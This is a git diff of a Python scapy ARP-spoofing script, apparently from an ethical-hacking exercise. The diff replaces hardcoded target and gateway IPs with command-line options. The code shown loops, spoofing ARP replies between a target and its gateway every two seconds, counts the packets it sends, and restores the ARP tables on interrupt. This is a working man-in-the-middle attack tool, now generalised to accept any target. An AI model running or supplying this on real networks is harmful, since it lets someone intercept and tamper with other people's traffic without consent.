@@ -1,4 +1,5 @@
 import scapy.all as scapy
+import optparse
 import time
 
 
@@ -45,14 +46,25 @@ def restore(dst_ip, src_ip):
     )
     scapy.sendp(packet, verbose=False, count=4)
 
+def get_arguments():
+    parser = optparse.OptionParser()
 
-target_ip="192.168.110.129"
-gateway_ip="192.168.110.2"
+    parser.add_option("-t", "--target", dest="target_ip", help="Target IP address")
+    parser.add_option("-g", "--gateway", dest="gateway_ip", help="Gateway IP address")
+    (options, arguments) = parser.parse_args()
+
+    if not options.target_ip:
+        parser.error("[-] Please specify a target IP address, use --help for more info.")
+    elif not options.gateway_ip:
+        parser.error("[-] Please specify a gateway IP address, use --help for more info.")
+    return options
+
 try:
     sent_packet_count = 0
+    options = get_arguments()
     while True:
-        spoof(target_ip, gateway_ip)
-        spoof(gateway_ip, target_ip)
+        spoof(options.target_ip, options.gateway_ip)
+        spoof(options.gateway_ip, options.target_ip)
         print("\r[+] Sent packets: " + str(sent_packet_count), end="")
         sent_packet_count += 2
         time.sleep(2)
@@ -60,5 +72,5 @@ try:
 except KeyboardInterrupt:
     print("\n[-] Detected CTRL + C ... Quitting.")
     print("[+] Restoring ARP tables...")
-    restore(target_ip, gateway_ip)
-    restore(gateway_ip, target_ip)
+    restore(options.target_ip, options.gateway_ip)
+    restore(options.gateway_ip, options.target_ip)
